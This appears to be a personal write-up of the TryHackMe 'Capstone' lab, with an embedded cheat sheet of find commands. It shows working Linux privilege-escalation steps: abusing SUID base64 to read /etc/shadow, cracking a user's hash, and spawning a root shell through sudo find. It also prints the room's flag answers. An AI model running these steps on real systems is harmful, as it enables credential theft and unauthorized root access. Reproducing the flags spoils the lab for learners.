---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/capstone/","tags":["CTF","write-up","SUID","sudo-l"]}
---


---
# Privilege Escalation
## Check for SUID files
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```
We found `base64`
![Pasted image 20240819181358.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819181358.png)
## Use https://gtfobins.github.io/ to exploit it.
We can read any file, we read `/etc/shadow` to see the hash of other users.
```shell
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```
![Pasted image 20240819181615.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819181615.png)
## On our machine crack the hash missy
Create a file passwd, copy the missy line of passwd
![Pasted image 20240819181914.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819181914.png)
Create the shadow, copy the missy line of shadow
![Pasted image 20240819182033.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819182033.png)
Unshadow the file using `unshadow` to the unshadowed file
```shell
unshadow passwd shadow > unshadowed
```
Crack the unshadowed file
![Pasted image 20240819182246.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819182246.png)
## Get the first flag
Login as missy
```shell
su missy
```
The flag is on `/home/missy/Documents`
![Pasted image 20240819182541.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819182541.png)
> [!check]- flag1.txt
> THM-42828719920544
## Escalate to root

Check `sudo -l` for missy
![Pasted image 20240819183619.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819183619.png)
Leverage `find`
```shell
sudo find / etc/passwd -exec /bin/bash \;
```
![Pasted image 20240819183906.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819183906.png)
We are root now
## Get the second flag
![Pasted image 20240819184137.png](/img/user/Write-ups/TryHackMe/attachments/Pasted%20image%2020240819184137.png)
> [!check]- flag2.txt
> THM-168824782390238


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                                                                                                                                        | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| `find .`                                                                                                                                                      | Search in the currenty dir                             |
| `find / -name dirname`                                                                                                                                        | Find a dirs by name in the /                           |
| `find . -iname my-file`                                                                                                                                       | Don't differen between Mayus                           |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | Redirect the (stderr) to a hole                        |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | list the contend of each dir                           |
| `find / -type f -perm 4000 2>/dev/null`                                                                                                                       | search files [[Operative System/Linux/Permisos/SUID\|SUID]]                                  |
| `find -a`<br>`-a \( -perm -u+s -o -perm -g+s \)`                                                                                                              | Combine conditions [[Operative System/Linux/Permisos/SUID\|SUID]] or [[Operative System/Linux/Permisos/SGID\|SGID]]<br>`-o ` is OR |
| `find / -type -d -group wheel 2>/dev/null`                                                                                                                    | find dirs in the group wheel                           |
| `find -executable`<br>`find / -perm a=x`                                                                                                                      | Find items executable                                  |
| `find / -writable -type d 2>/dev/null`<br>`find / -perm -222 -type d 2>/dev/null`<br>`find / -perm -o w -type d 2>/dev/null`                                  | Find world-writable folders                            |
| `find / -writable -type d 2>/dev/null \| cut -d "/" -f 2 \| sort -u`                                                                                          | First Writable folders                                 |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u`<br>`find / -writable 2>/dev/null \| grep  usr \| cut -d "/" -f 2,3 \| sort -u` | 1 and 2 Writable folders<br>`usr`                      |
| `find ! -executable`                                                                                                                                          | Find items **not** executables                         |
| `find / -user root -writable 2>/dev/null`<br>`find / -user root -executable -type -f 2>/dev/null`<br>                                                         | Find items from root user                              |
| `find -name dex\* 2>/dev/null`                                                                                                                                | Find files that start by dex                           |
| `find -name \*exdump\* 2>/dev/null`                                                                                                                           | FInd files that content exdump between his name        |
| `find -name dex\*.sh 2>/dev/null`                                                                                                                             | Start with dex and finish in .sh                       |
| `find / -size +5G`                                                                                                                                            | List all files with more than 5 Gigabites              |
| `find / -size 10M`                                                                                                                                            | List all files with exactly 10 megabytes               |
| `find / -size -5M`                                                                                                                                            | List all files with less than 5 megabytes              |
| `find / - empty`                                                                                                                                              | Find empty items in the system                         |
| `find . -name "*.md*" -type f -exec grep -l "text to search" {} +`                                                                                            | Search a file by the content of it                     |
| `find / -mtime 10`                                                                                                                                            | Find files that were modified in the last 10 days      |
| `find / -atime 10`                                                                                                                                            | Find files that were accessed in the last 10 day       |
| `find / -cmin -60`                                                                                                                                            | find files changed within the last hour (60 minutes)   |
| `find / -amin -60`                                                                                                                                            | find files accesses within the last hour (60 minutes)  |

- **c** – bytes
- **k** – kilobytes
- **M** – megabytes
- **G** – gigabytes
- **b** – trozos de 512 bytes

</div></div>
